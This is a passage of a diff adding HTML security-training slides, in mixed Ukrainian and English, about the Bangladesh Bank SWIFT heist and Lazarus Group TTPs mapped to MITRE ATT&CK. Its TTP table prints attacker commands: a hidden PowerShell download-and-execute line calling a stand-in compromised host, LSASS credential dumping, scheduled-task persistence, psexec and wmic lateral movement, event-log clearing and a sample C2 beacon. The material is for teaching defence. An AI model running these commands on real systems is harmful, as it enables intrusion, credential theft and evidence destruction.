+- Bangladesh Bank hired forensics firms (FireEye, BAE Systems)
+- Interpol investigation launched
+- Philippines Senate inquiry (televised hearings)
+- Only $15M frozen (из $81M), але later released
+- $0 ultimately recovered — money laundered успішно
+            </pre>
+
+            <p><strong>Phase 7: Attribution & Aftermath</strong></p>
+
+            <ul>
+                <li><strong>Forensic Investigation findings:</strong>
+                    <ul>
+                        <li>Malware samples recovered showed code overlap з інших Lazarus campaigns</li>
+                        <li>C2 infrastructure links до North Korean operations</li>
+                        <li>TTPs identical to Sony Pictures hack (2014)</li>
+                    </ul>
+                </li>
+                <li><strong>US Government Attribution:</strong>
+                    <ul>
+                        <li>FBI officially attributes attack до North Korea (December 2017)</li>
+                        <li>US Treasury sanctions North Korean individuals</li>
+                        <li>DOJ indictment Park Jin Hyok (Lazarus member, 2018)</li>
+                    </ul>
+                </li>
+                <li><strong>Impact на Bangladesh Bank:</strong>
+                    <ul>
+                        <li>Governor Atiur Rahman резиг resignation (політичний тиск)</li>
+                        <li>Multiple IT staff fired</li>
+                        <li>Complete SWIFT infrastructure rebuild</li>
+                        <li>Cybersecurity budget збільшено 10x</li>
+                    </ul>
+                </li>
+                <li><strong>Global Banking Response:</strong>
+                    <ul>
+                        <li>SWIFT issues Security Advisory (mandatory security controls)</li>
+                        <li>Introduction SWIFT Customer Security Programme (CSP)</li>
+                        <li>Banks globally audit SWIFT segmentation</li>
+                        <li>Enhanced transaction monitoring rules</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h5>🔐 Security Failures Exploited:</h5>
+
+            <div class="error-box">
+                <h4>❌ Critical Security Weaknesses at Bangladesh Bank:</h4>
+                <ol>
+                    <li><strong>Network Segmentation Failure:</strong>
+                        <ul>
+                            <li>NO firewall між SWIFT network та corporate network</li>
+                            <li>SWIFT workstations accessible через internal network</li>
+                            <li>Violation SWIFT CSP baseline requirements</li>
+                        </ul>
+                    </li>
+                    <li><strong>Second-hand Equipment:</strong>
+                        <ul>
+                            <li>$10 second-hand switches замість enterprise-grade hardware</li>
+                            <li>No proper network monitoring/IDS</li>
+                        </ul>
+                    </li>
+                    <li><strong>Insufficient Monitoring:</strong>
+                        <ul>
+                            <li>No SIEM system</li>
+                            <li>No 24/7 SOC</li>
+                            <li>Weak log retention policy</li>
+                        </ul>
+                    </li>
+                    <li><strong>Patch Management:</strong>
+                        <ul>
+                            <li>Outdated Windows servers (unpatched vulnerabilities)</li>
+                            <li>Outdated SWIFT Alliance Access version</li>
+                        </ul>
+                    </li>
+                    <li><strong>Physical Security:</strong>
+                        <ul>
+                            <li>SWIFT printers в non-secure area</li>
+                            <li>No printer logging/monitoring</li>
+                        </ul>
+                    </li>
+                    <li><strong>Incident Response:</strong>
+                        <ul>
+                            <li>No IR plan</li>
+                            <li>Weekend staffing inadequate</li>
+                            <li>Delayed detection (3+ days)</li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+
+            <h5>📚 Lessons Learned:</h5>
+
+            <div class="info-box">
+                <h4>✅ Key Takeaways for Banking Security:</h4>
+                <ol>
+                    <li><strong>Network Segregation is CRITICAL:</strong>
+                        <ul>
+                            <li>SWIFT infrastructure MUST be isolated (air-gapped або strict firewall rules)</li>
+                            <li>No direct connectivity між SWIFT та corporate network</li>
+                            <li>Jump servers/bastion hosts з MFA for administration</li>
+                        </ul>
+                    </li>
+                    <li><strong>Defense in Depth:</strong>
+                        <ul>
+                            <li>Multiple layers of security (perimeter → network → endpoint → data)</li>
+                            <li>Assume breach mindset: detection важливіше за prevention alone</li>
+                        </ul>
+                    </li>
+                    <li><strong>Transaction Monitoring:</strong>
+                        <ul>
+                            <li>Automated alerts для unusual SWIFT activity</li>
+                            <li>Out-of-hours transaction blocking або dual authorization</li>
+                            <li>Amount threshold alerts</li>
+                            <li>Destination country risk scoring</li>
+                        </ul>
+                    </li>
+                    <li><strong>Security Awareness:</strong>
+                        <ul>
+                            <li>Regular phishing simulations for staff</li>
+                            <li>Spear-phishing recognition training</li>
+                            <li>"Report suspicious emails" culture</li>
+                        </ul>
+                    </li>
+                    <li><strong>Incident Response Readiness:</strong>
+                        <ul>
+                            <li>24/7 SOC coverage (включно з weekends/holidays)</li>
+                            <li>IR playbook для SWIFT compromise scenario</li>
+                            <li>Direct line до Federal Reserve та SWIFT для emergency</li>
+                        </ul>
+                    </li>
+                    <li><strong>Regular Security Audits:</strong>
+                        <ul>
+                            <li>Annual penetration testing на SWIFT infrastructure</li>
+                            <li>Compliance audits (SWIFT CSP, ISO 27001)</li>
+                            <li>Third-party security assessments</li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+
+            <h4>📖 Slide 5: Lazarus Group TTPs (Tactics, Techniques, and Procedures)</h4>
+
+            <p>Розуміння <strong>TTPs (Tactics, Techniques, and Procedures)</strong> Lazarus Group критично важливе для:</p>
+            <ul>
+                <li>Створення effective detection rules в SIEM/EDR systems</li>
+                <li>Threat hunting based on behavioral patterns</li>
+                <li>Security control prioritization (закрити найбільш likely attack vectors)</li>
+                <li>Incident response preparation (знати що шукати during investigation)</li>
+            </ul>
+
+            <h5>🛠️ Lazarus Group TTPs по MITRE ATT&CK:</h5>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th style="width: 20%;">Tactic (Категорія)</th>
+                        <th style="width: 30%;">Techniques (Методи)</th>
+                        <th>Lazarus Group Implementation (Як саме вони це роблять)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Reconnaissance<br>(TA0043)</strong></td>
+                        <td>
+                            • T1589.002: Email Addresses<br>
+                            • T1594: Search Victim-Owned Websites<br>
+                            • T1597: Search Open Technical Databases
+                        </td>
+                        <td>
+                            <strong>OSINT Collection:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li>LinkedIn scraping для employee names та roles</li>
+                                <li>GitHub repositories для leaked credentials</li>
+                                <li>Job postings для technology stack information</li>
+                                <li>Shodan/Censys для exposed services</li>
+                                <li>Social media profiling targets</li>
+                            </ul>
+                            <strong>Example:</strong> Before Bangladesh Bank attack, identified IT admin через LinkedIn, discovered họ використовують Oracle DB through job posting.
+                        </td>
+                    </tr>
+                    <tr style="background-color: rgba(231, 76, 60, 0.1);">
+                        <td><strong>Initial Access<br>(TA0001)</strong></td>
+                        <td>
+                            • T1566.001: Spearphishing Attachment<br>
+                            • T1566.002: Spearphishing Link<br>
+                            • T1195: Supply Chain Compromise
+                        </td>
+                        <td>
+                            <strong>Primary method: Spear-phishing</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>Email format:</strong> Job applications, invoices, payment confirmations</li>
+                                <li><strong>Attachments:</strong>
+                                    <ul>
+                                        <li>Malicious PDF з Adobe Reader exploit</li>
+                                        <li>MS Office docs з macro (VBA payload)</li>
+                                        <li>ZIP archives з LNK files</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Obfuscation:</strong> PDF від legitimate service (WeTransfer, Dropbox links)</li>
+                                <li><strong>Social engineering:</strong> Impersonation known suppliers або recruitment agencies</li>
+                            </ul>
+                            <strong>Advanced technique: Supply Chain (AppleJeus):</strong> Fake cryptocurrency trading software з trojanized installer.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Execution<br>(TA0002)</strong></td>
+                        <td>
+                            • T1204.002: Malicious File<br>
+                            • T1059.003: Windows Command Shell<br>
+                            • T1059.001: PowerShell
+                        </td>
+                        <td>
+                            <strong>Multi-stage execution:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>Stage 1:</strong> Exploit execution (PDF/Office macro)</li>
+                                <li><strong>Stage 2:</strong> Dropper downloads payload:
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+cmd.exe /c powershell.exe -WindowStyle Hidden -NoProfile
+  -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).
+  DownloadString('http://compromised-site.com/a.ps1')</pre>
+                                </li>
+                                <li><strong>Stage 3:</strong> PowerShell або binary payload execution</li>
+                                <li><strong>Anti-analysis:</strong> Sleep timers, sandbox detection (CPU count < 2 → exit)</li>
+                            </ul>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Persistence<br>(TA0003)</strong></td>
+                        <td>
+                            • T1547.001: Registry Run Keys<br>
+                            • T1053.005: Scheduled Tasks<br>
+                            • T1543.003: Windows Service
+                        </td>
+                        <td>
+                            <strong>Multiple persistence mechanisms:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>Registry:</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\{GUID}
+Value: "C:\Users\%USERNAME%\AppData\Roaming\{random}\{random}.exe"</pre>
+                                </li>
+                                <li><strong>Scheduled Task:</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck"
+  /tr "C:\...\malware.exe" /sc onlogon /ru SYSTEM</pre>
+                                </li>
+                                <li><strong>WMI Event Subscription:</strong> (Advanced) permanent persistence through WMI</li>
+                            </ul>
+                            <strong>Redundancy:</strong> Lazarus часто створює 2-3 persistence mechanisms для resilience.
+                        </td>
+                    </tr>
+                    <tr style="background-color: rgba(231, 76, 60, 0.1);">
+                        <td><strong>Credential Access<br>(TA0006)</strong></td>
+                        <td>
+                            • T1555.003: Credentials from Web Browsers<br>
+                            • T1003.001: LSASS Memory<br>
+                            • T1056.001: Keylogging
+                        </td>
+                        <td>
+                            <strong>Credential theft arsenal:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>Browser credentials:</strong>
+                                    <ul>
+                                        <li>Chrome: AppData\Local\Google\Chrome\User Data\Default\Login Data (SQLite DB)</li>
+                                        <li>Firefox: logins.json file</li>
+                                        <li>Decrypt using Windows DPAPI</li>
+                                    </ul>
+                                </li>
+                                <li><strong>LSASS dumping:</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+# Using ProcDump (Sysinternals)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Or direct Mimikatz
+sekurlsa::logonpasswords</pre>
+                                </li>
+                                <li><strong>Keylogging:</strong>
+                                    <ul>
+                                        <li>SetWindowsHookEx API (global keyboard hook)</li>
+                                        <li>Target SWIFT Alliance Access login screens</li>
+                                        <li>Log credentials to C2</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                            <strong>Bangladesh Bank:</strong> Keylogger на SWIFT workstation captured operator passwords → full SWIFT access.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Discovery<br>(TA0007)</strong></td>
+                        <td>
+                            • T1082: System Information Discovery<br>
+                            • T1016: System Network Configuration<br>
+                            • T1087: Account Discovery
+                        </td>
+                        <td>
+                            <strong>Reconnaissance commands:</strong>
+                            <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+# System info
+systeminfo
+wmic computersystem get domain
+whoami /all
+
+# Network discovery
+ipconfig /all
+net view /all
+nltest /domain_trusts
+arp -a
+
+# User enumeration
+net user /domain
+net group "Domain Admins" /domain
+net localgroup administrators
+
+# Process discovery
+tasklist /v
+wmic process list brief
+Get-Process (PowerShell)</pre>
+                            <strong>Goal:</strong> Map internal network, identify high-value targets (SWIFT servers, Domain Controllers).
+                        </td>
+                    </tr>
+                    <tr style="background-color: rgba(231, 76, 60, 0.1);">
+                        <td><strong>Lateral Movement<br>(TA0008)</strong></td>
+                        <td>
+                            • T1021.002: SMB/Windows Admin Shares<br>
+                            • T1021.001: Remote Desktop<br>
+                            • T1550.002: Pass the Hash
+                        </td>
+                        <td>
+                            <strong>Lateral movement techniques:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>PsExec (Sysinternals):</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+psexec.exe \\TARGET-PC -u DOMAIN\admin -p Password123 cmd.exe</pre>
+                                </li>
+                                <li><strong>WMIC:</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+wmic /node:TARGET-PC /user:admin process call create "cmd.exe /c malware.exe"</pre>
+                                </li>
+                                <li><strong>PowerShell Remoting:</strong>
+                                    <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+Invoke-Command -ComputerName TARGET-PC -ScriptBlock {malware commands}</pre>
+                                </li>
+                                <li><strong>RDP:</strong> After credential theft, RDP до critical servers</li>
+                            </ul>
+                            <strong>Path:</strong> Workstation → File Server → Domain Controller → SWIFT Gateway
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Command & Control<br>(TA0011)</strong></td>
+                        <td>
+                            • T1071.001: Web Protocols (HTTPS)<br>
+                            • T1132.001: Standard Encoding<br>
+                            • T1568.002: Domain Generation Algorithms
+                        </td>
+                        <td>
+                            <strong>C2 Communication:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>Protocol:</strong> HTTPS (port 443) для blending з legitimate traffic</li>
+                                <li><strong>Encoding:</strong>
+                                    <ul>
+                                        <li>RC4 encryption для payload</li>
+                                        <li>Base64 encoding</li>
+                                        <li>XOR obfuscation</li>
+                                    </ul>
+                                </li>
+                                <li><strong>C2 servers:</strong>
+                                    <ul>
+                                        <li>Compromised legitimate websites (WordPress sites)</li>
+                                        <li>Bulletproof hosting (Singapore, Netherlands)</li>
+                                        <li>DGA domains для failover</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Beaconing:</strong> Every 5-10 minutes check-in (or variable intervals for stealth)</li>
+                            </ul>
+                            <strong>Example C2 request:</strong>
+                            <pre style="margin: 5px 0; padding: 5px; background: #f5f5f5;">
+POST /news/index.php HTTP/1.1
+Host: compromised-website.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)
+Content-Type: application/x-www-form-urlencoded
+
+data=BASE64_ENCRYPTED_BEACON</pre>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Exfiltration<br>(TA0010)</strong></td>
+                        <td>
+                            • T1041: Exfiltration Over C2 Channel<br>
+                            • T1020: Automated Exfiltration
+                        </td>
+                        <td>
+                            <strong>Data exfiltration methods:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li>Credentials, cookies → C2 via HTTPS</li>
+                                <li>Screenshots → encrypted archive → C2</li>
+                                <li>Database dumps → split into chunks → exfiltrate</li>
+                                <li>SWIFT transaction logs → exfiltrate для intelligence</li>
+                            </ul>
+                            <strong>Encryption:</strong> All exfil data encrypted before transmission (AES або RC4).
+                        </td>
+                    </tr>
+                    <tr style="background-color: rgba(231, 76, 60, 0.1);">
+                        <td><strong>Impact<br>(TA0040)</strong></td>
+                        <td>
+                            • T1565.001: Stored Data Manipulation<br>
+                            • T1490: Inhibit System Recovery<br>
+                            • T1485: Data Destruction
+                        </td>
+                        <td>
+                            <strong>Final Impact actions:</strong>
+                            <ul style="margin: 5px 0;">
+                                <li><strong>SWIFT Manipulation:</strong>
+                                    <ul>
+                                        <li>Create fraudulent MT103 messages</li>
+                                        <li>Modify Alliance Access database (delete audit trails)</li>
+                                        <li>Suppress printer output (hidden confirmations)</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Evidence Destruction:</strong>
+                                    <ul>
+                                        <li>Clear Windows Event Logs: <code>wevtutil.exe cl Security</code></li>
+                                        <li>Delete SWIFT transaction logs</li>
+                                        <li>Wiper malware (Destover) для disk destruction</li>
+                                        <li>Timestomp files (modify MACE timestamps)</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Anti-Forensics:</strong>
+                                    <ul>
+                                        <li>Secure delete tools (SDelete)</li>
+                                        <li>RAM wiping</li>
+                                        <li>Remove malware artifacts</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                            <strong>Bangladesh Bank:</strong> Після $81M theft, deployed wiper malware to destroy evidence, deleted SWIFT logs, cleared Windows Event Logs на compromised hosts.
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <!-- Продовження файлу буде у наступному повідомленні через обмеження розміру... -->
+
